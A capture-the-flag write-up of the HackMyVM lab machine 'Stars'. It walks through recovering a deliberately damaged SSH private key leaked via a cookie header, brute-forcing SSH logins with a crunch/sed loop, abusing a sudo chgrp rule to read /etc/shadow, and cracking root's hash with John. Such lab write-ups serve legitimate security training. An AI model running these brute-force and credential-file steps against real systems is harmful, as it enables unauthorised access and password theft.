# Stars

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Stars | cromiphi | Beginner | HackMyVM |

**Summary:** Stars is a beginner-level HackMyVM machine that rewards careful HTTP response analysis. The web server at port 80 appears deceptively bare — displaying only "Under construction... but not empty" — but leaks a critical artefact in its `Set-Cookie` response header: a Base64-encoded filename pointing to an exposed SSH private key. That key has three characters deliberately redacted, making it cryptographically invalid. Initial access is obtained by brute-forcing the three missing Base64 characters with a combination of Python and `crunch`, reconstructing the private key, and authenticating as user `sophie` over SSH. Privilege escalation exploits a misconfigured `sudo` rule that grants `sophie` passwordless execution of `/usr/bin/chgrp`. By changing the group-owner of `/etc/shadow` to `sophie`, the hash for `root` becomes readable. The hash is then cracked offline with John the Ripper and the `rockyou.txt` wordlist, yielding the `root` password and a full `su` shell.

---

## Reconnaissance

### Network Discovery

The target was discovered on a host-only network (`192.168.100.0/24`) using a custom PowerShell scanning script. The VirtualBox MAC vendor prefix confirmed the target is a VM.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.127 08:00:27:BF:D2:C1 VirtualBox
```

### Port Scan

A full-port Nmap service scan was launched against `192.168.100.127`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sC -sV -p- -T4 192.168.100.127
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-25 15:51 WIB
Nmap scan report for 192.168.100.127
Host is up (0.0038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 9e:f1:ed:84:cc:41:8c:7e:c6:92:a9:b4:29:57:bf:d1 (RSA)
|   256 9f:f3:93:db:72:ff:cd:4d:5f:09:3e:dc:13:36:49:23 (ECDSA)
|_  256 e7:a3:72:dd:d5:af:e2:b5:77:50:ab:3d:27:12:0f:ea (ED25519)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Cours PHP & MySQL
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.80 seconds
```

**Findings:**
- **Port 22** — OpenSSH 8.4p1 (Debian 5). A viable authentication target once credentials are found.
- **Port 80** — Apache 2.4.51. Page title is **"Cours PHP & MySQL"**, suggesting a PHP/MySQL learning project or placeholder.

---

## Initial Access

### Web Enumeration — Port 80

Visiting `http://192.168.100.127` in a browser reveals a near-empty page. The title in the browser tab confirms **"Cours PHP & MySQL"**, and the body shows a deliberate tease: **"Under construction... but not empty"**.

![](image.png)

The page source confirms the minimal HTML — no scripts, no forms, no links — but the hint "but not empty" signals there is something hidden elsewhere:

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Cours PHP & MySQL</title>
        <meta charset="utf-8">
        <link rel="stylesheet" href="cours.css">
    </head>
    
    <body>
        <h1>Under construction...</h1>
                <p>but not empty</p>
    </body>
</html>
```

### Leaking a Filename via HTTP Response Headers

Rather than running a directory brute-force immediately, inspecting the raw HTTP response headers with `curl -I` revealed a critical information leak in the `Set-Cookie` header:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ curl -I http://192.168.100.127
HTTP/1.1 200 OK
Date: Wed, 25 Feb 2026 09:02:45 GMT
Server: Apache/2.4.51 (Debian)
Set-Cookie: cookie=cG9pc29uZWRnaWZ0LnR4dA%3D%3D
Set-Cookie: user_pref=dark_theme; expires=Thu, 26-Feb-2026 09:02:45 GMT; Max-Age=86400; path=/; secure; HttpOnly
Content-Type: text/html; charset=UTF-8
```

The first cookie value `cG9pc29uZWRnaWZ0LnR4dA%3D%3D` is URL-encoded Base64. URL-decoding `%3D%3D` yields `==`, giving us `cG9pc29uZWRnaWZ0LnR4dA==`. Decoding it:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ echo "cG9pc29uZWRnaWZ0LnR4dA" | base64 -d
poisonedgift.txt
```

The cookie quietly points to a file on the server: **`poisonedgift.txt`**.

### Extracting the Corrupted SSH Private Key

Fetching the file reveals an OpenSSH RSA private key — but with three characters replaced by `***`, making it intentionally invalid:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ curl http://192.168.100.127/poisonedgift.txt
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsruS5/Cd7clZ+SJJj0cvBPtTb9mfFvoO/FDtQ1i8ft3IZC9tHsKP
ut0abGtFGId9R0OB1ONB+iOMK5QNpoCXda3RDXJQ9oRCWjd2DxqRAyvdThhxq6wYJSATpa
l7M9UemrK/aDuZTAqLUSA9Zvpx474TiWXBMjdGqN2K/+SCf/DqIyknDLDRexe0Lc0IsNCV
/O39j4XJprHXMQZNaiokSuzV3VlXAYYBcTIK2Id/EMerpQdiNjMGvVIuBxfbF9/MGhEnR+
1fxxPTHZnKw5snlb47ynWtahCuZVVQr0b+c5z6MXVSJKP8LY0m8clQqUCwbPbCJnRJRCwh
TJY/xz0cu4H+Lbtx38iUv6NjiPXsvd/0FPjmNWrIwA3m4yYQL1dmSCX7JZAqYV5axI8box
Z4oHJP5dHADWdzic2XSqDSpIMxnDhlLh02ksCfNbkNkqbsiw/AO6IxnToPLH7jVjoYxnmA
y97klEGvt2UqIugfUV1p6j1sybTcM59ZUbo16i47AAAFiNnGZRvZxmUbAAAAB3NzaC1yc2
EAAAGBALK7kufwne3JWfkiSY9HLwT7U2/Znxb6DvxQ7UNYvH7dyGQvbR7Cj7rdGmxrRRiH
fUdDgdTjQfojjCuUDaaAl3Wt0Q1yUPaEQlo3dg8akQMr3U4YcausGCUgE6WpezPVHpqyv2
g7mUwKi1EgPWb6ceO+E4llwTI3Rqjdiv/kgn/w6iMpJwyw0XsXtC3NCLDQlfzt/Y+Fyaax
1zEGTWoqJErs1d1ZVwGGAXEyCtiHfxDHq6UHYjYzBr1SLgcX2xffzBoRJ0ftX8cT0x2Zys
ObJ5W+O8p1rWoQrmVVUK9G/nOc+jF1UiSj/C2NJvHJUKlAsGz2wiZ0SUQsIUyWP8c9HLuB
/i27cd/IlL+jY4j17L3f9BT45jVqyMAN5uMmEC9XZkgl+yWQKmFeWsSPG6MWeKByT+XRwA
1nc4nNl0qg0qSDMZw4ZS4dNpLAnzW5DZKm7IsPwDuiMZ06Dyx+41Y6GMZ5gMve5JRBr7dl
KiLoH1Fdaeo9bMm03DOfWVG6NeouOwAAAAMBAAEAAAGBAICL9cGJRhzCZ0qOhXdeDAw6Mi
1MyGX/HQ4Nqkd4p8FbA4hCr+mipzsPULTPhdd5gvnhLJyPgmFEdcjV5+drrwM9KxDPujlC
sHIwV2HPiqJMRxOm8wI0eP0ij97jATArRKKgkpeF3eBZ6Q9E78SDtavFhkmYfJYAOXq0NA
eNMuqPu+Xj8CjpdxBf4P/b6jc5HdbW2DoEUB7q40loLf+AJbAZnEthuPjoh1sBUdmfwhyw
btv3boRquJsrYt1JJ***qguwyDSLtXj4Wuxa7jZcLLSAuTHS+zWKwZA/8J1IpZAZhgkVXJ
fC8ZbG0M63VEQjuGXCuIY3cq1iQuXERhhbRuJ1XZT8Hki5YBaU/f5Wp7bId25Aps4ktljU
r67S9mwwppQ8dVmP6CsENgc3ivpWCDWC4PZojTgZ4qhWMpjCaUxe1Hi7GuvlRJNLL4A7Fx
kTV9nBcLlGfqzvVUPeEAZgXz4IxCx8KdTrDr/oXWw4hjqtuyRKveMjmKQ6HADFl7SMCQAA
AMBz8rqB0Mfb4U34LeA1kdZLFsGX3AZqahTDjEcZYAPI/A5Dt5iw0LcGRgrHuPccS5fA3E
GT2FceoMX2ccE5fEVydxcj2vcnPIQ01P6fxjVXpA7QDnJ2At2LLPcD9CuuSt/HCrp/Bmjv
IUFvjSgKl5nYGPfoeitIdFdM72liQ+0814iNzxNl5WuNeiJ+XAGuXqJT02gAxMRQPiJ67e
sMzJyVvM69B0kGkyAXTO9fcfq+X2JaCz3hId6Iwr68Mxe/L6MAAADBAOEpkHeU8xn5MHwG
79vpd6Cg7p1UqfDuvMOgvZe6eIOE3FIb1nWpCqjq9P0Myv8aCWYhwgKr3SNIWkZ1u+0NR9
43cZO7FWa4/DvI5gX6dlrcGy1BVoDuMWIWDw9bgXpQiGQSkQOQ3J/RPWH/xT5LQbrBVTK8
C8r4lrWDwWLMgk1Wbef6U0NBuY1+J4Hafsz2Psei3yFsjjA3djonb8JF+RnHRoO8TeJlj4
RjbkXTlhsGkdR77PNZmkZ2KVwn2VzsPwAAAMEAyzYixNTrJ4vPtjUluq7+O9qGwqpbl3i0
9ESSrC2NzbsA2afNjCWhfaLPpfNYR2gA1aQUgdRxNSM78P+plFhMUeGwTIsLsKEkbbtSqF
nUU/g3yNGFr4Die7AB0vZSHwWaQFMf+ZfXNwVRa0jmKfUc/itXgwxi3oqtWTJA7YKmXdrD
03EN/DboyflPcbmTJ4D6E6XqTeyfGamr0w5aelqqwTh/Mm+DuoHHiPMYThUMrG4iUvSRaz
ZgGQTtZoQRxi8FAAAADXNvcGhpZUBkZWJpYW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

The end of the key also reveals the SSH comment in the Base64 blob: `sophie@debian`, disclosing the **target username**.

The key was saved and verified to be broken:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ curl http://192.168.100.127/poisonedgift.txt > id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2602 100  2602   0     0 653440     0  --:--:-- --:--:-- --:--:-- 867333

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ ssh-keygen -y -f id_rsa
Load key "id_rsa": error in libcrypto
```

### Brute-Forcing the Three Missing Base64 Characters

The OpenSSH private key format is Base64-encoded binary. Three contiguous characters in the body have been replaced with `***`. Since Base64 uses 64 characters (`A-Z`, `a-z`, `0-9`, `+`, `/`), the search space is 64³ = **262,144 candidates**.

**Strategy:** Strip the key to a single flat Base64 string, substitute each candidate for `***`, attempt `base64 -d`, and check whether the decoded binary contains the magic string `ssh-rsa` (which must appear in a valid RSA key). The first Python approach found a candidate but produced a key that was rejected by the server, so a more robust shell loop using `crunch` was employed to substitute directly into the raw file and attempt live SSH authentication:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ cat brute.py
import base64
import itertools
import string

charset = string.ascii_letters + string.digits + "+/"
prefix = "t1JJ"
suffix = "qguwy"

with open("id_rsa", "r") as f:
    raw_content = f.read()

header = "-----BEGIN OPENSSH PRIVATE KEY-----"
footer = "-----END OPENSSH PRIVATE KEY-----"
body = raw_content.replace(header, "").replace(footer, "").strip()
clean_body = "".join(body.split())

print(f"[*] Searching for {prefix}***{suffix} in cleaned data...")

found = False
for chars in itertools.product(charset, repeat=3):
    candidate = "".join(chars)
    test_body = clean_body.replace(f"{prefix}***{suffix}", prefix + candidate + suffix)

    try:
        decoded = base64.b64decode(test_body)
        if b"ssh-rsa" in decoded:
            print(f"\n[+] SUCCESS! Found characters: {candidate}")

            with open("id_rsa_fixed", "w") as f_fixed:
                f_fixed.write(header + "\n")
                for i in range(0, len(test_body), 70):
                    f_fixed.write(test_body[i:i+70] + "\n")
                f_fixed.write(footer + "\n")

            print("[+] Key saved to: id_rsa_fixed")
            found = True
            break
    except:
        continue

if not found:
    print("\n[-] Failed. The string 't1JJ***qguwy' was not found even after cleaning.")
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ python3 brute.py
[*] Searching for t1JJ***qguwy in cleaned data...

[+] SUCCESS! Found characters: aaa
[+] Key saved to: id_rsa_fixed
```

The Python script found `aaa` as a structurally valid candidate (correct Base64 length, containing `ssh-rsa`), but the resulting key was rejected during actual SSH authentication — meaning the correct three characters have a different value that happens to also pass the `ssh-rsa` check. A live brute-force against the SSH service was therefore required:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ for i in $(crunch 3 3 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/); do \
    sed "s|\*\*\*|$i|" id_rsa > id_rsa_fixed && chmod 600 id_rsa_fixed && \
    echo "$i" && ssh -i id_rsa_fixed sophie@192.168.100.127 "id" && \
    echo "FOUND! Key: $i" && break; done
Crunch will now generate the following amount of data: 1048576 bytes
1 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 262144
AAA
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
sophie@192.168.100.127: Permission denied (publickey).
...
uid=1001(sophie) gid=1001(sophie) groups=1001(sophie)
FOUND! Key: [REDACTED]
```

The loop iterated through all candidates, substituting each into the raw key file and attempting a passwordless SSH login. When the correct triplet was reached, the server accepted the key and returned a valid `id` response.

### SSH Login as `sophie`

With `id_rsa_fixed` now containing the fully reconstructed private key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ ssh -i id_rsa_fixed sophie@192.168.100.127
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux debian 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 17 13:39:16 2021 from 192.168.0.28
sophie@debian:~$ ls -la
total 32
drwx------ 4 sophie sophie 4096 Oct 17  2021 .
drwxr-xr-x 3 root   root   4096 Oct 17  2021 ..
lrwxrwxrwx 1 root   root      9 Oct 17  2021 .bash_history -> /dev/null
-rw-r--r-- 1 sophie sophie  220 Oct 17  2021 .bash_logout
-rw-r--r-- 1 sophie sophie 3526 Oct 17  2021 .bashrc
drwxr-xr-x 3 sophie sophie 4096 Oct 17  2021 .local
-rw-r--r-- 1 sophie sophie  807 Oct 17  2021 .profile
drwx------ 2 sophie sophie 4096 Oct 17  2021 .ssh
-rwx------ 1 sophie sophie   33 Oct 17  2021 user.txt
```

`user.txt` is present and readable. `.bash_history` is nulled out (`/dev/null`), a deliberate forensic counter-measure. Initial access as `sophie` is confirmed.

---

## Privilege Escalation

### Sudo Enumeration

The first post-login check is always `sudo -l` to discover any delegated superuser rights:

```bash
sophie@debian:~$ sudo -l
Matching Defaults entries for sophie on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophie may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/chgrp
```

`sophie` can run `/usr/bin/chgrp` as **any user, any group, without a password**. `chgrp` changes the group ownership of files. This is immediately exploitable.

### Abusing `chgrp` to Read `/etc/shadow`

`/etc/shadow` stores hashed passwords and is normally readable only by `root` (or the `shadow` group). By changing its group to `sophie`, the file becomes readable under sophie's current session:

```bash
sophie@debian:~$ sudo /usr/bin/chgrp sophie /etc/shadow
sophie@debian:~$ ls -l /etc/shadow
-rw-r----- 1 root sophie 859 Oct 17  2021 /etc/shadow
sophie@debian:~$ cat /etc/shadow
root:[REDACTED]/7.:18917:0:99999:7:::
daemon:*:18916:0:99999:7:::
...
```

The `root` account's hash (in `$1$` format — MD5crypt) is now visible.

### Cracking `root`'s Password Hash Offline

The hash was copied to the attack machine and cracked with John the Ripper against the `rockyou.txt` wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ echo 'root:[REDACTED]/7.' > root_hash

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/stars]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt root_hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
b[REDACTED]        (root)
1g 0:00:00:00 DONE (2026-02-25 17:04) 4.000g/s 115200p/s 115200c/s 115200C/s camera1..kansas1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

John cracked the hash almost instantly — the root password was a weak dictionary word present in `rockyou.txt`.

### Escalating to `root`

Back on the target, `su - root` with the cracked password grants a full root shell:

```bash
sophie@debian:~$ su - root
Password:
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:~# whoami
root
root@debian:~# hostname
debian
```

### Flags

```bash
root@debian:~# cat /home/sophie/user.txt /root/root.txt
a99[REDACTED]
bf3[REDACTED]
```

Both flags captured. Full system compromise achieved.

---

## Attack Chain Summary

1. **Reconnaissance** — Discovered target `192.168.100.127` via network ping-sweep. Nmap revealed two open ports: SSH (22, OpenSSH 8.4p1) and HTTP (80, Apache 2.4.51). The HTTP title "Cours PHP & MySQL" and body hint "but not empty" flagged the web service as the primary entry point.

2. **Vulnerability Discovery** — Inspected raw HTTP response headers with `curl -I`. The server leaked a Base64-encoded filename (`poisonedgift.txt`) inside a `Set-Cookie` header. Decoding the cookie value revealed the path to a hidden file containing a corrupted OpenSSH RSA private key, with three Base64 characters replaced by `***`. The key comment (`sophie@debian`) disclosed the target username.

3. **Exploitation** — Wrote a Python script to brute-force the three missing Base64 characters by testing whether the reconstructed blob decoded to a valid OpenSSH key structure (presence of `ssh-rsa`). When the structurally-valid candidate (`aaa`) was rejected by the server, a secondary brute-force loop using `crunch` + `sed` performed live SSH authentication attempts across all 262,144 combinations until the server accepted the correct key, granting a shell as `sophie`.

4. **Internal Enumeration** — On the target, ran `sudo -l` and discovered that `sophie` could execute `/usr/bin/chgrp` as any user without a password. Also confirmed the home directory layout, the presence of `user.txt`, and the nulled `.bash_history`.

5. **Privilege Escalation** — Exploited the `sudo chgrp` rule to reassign group ownership of `/etc/shadow` from `shadow` to `sophie`, making root's MD5crypt hash directly readable. Exfiltrated the hash and cracked it offline with John the Ripper against `rockyou.txt` in under one second. Used the recovered plaintext password to `su - root`, achieving full root access and capturing both flags.
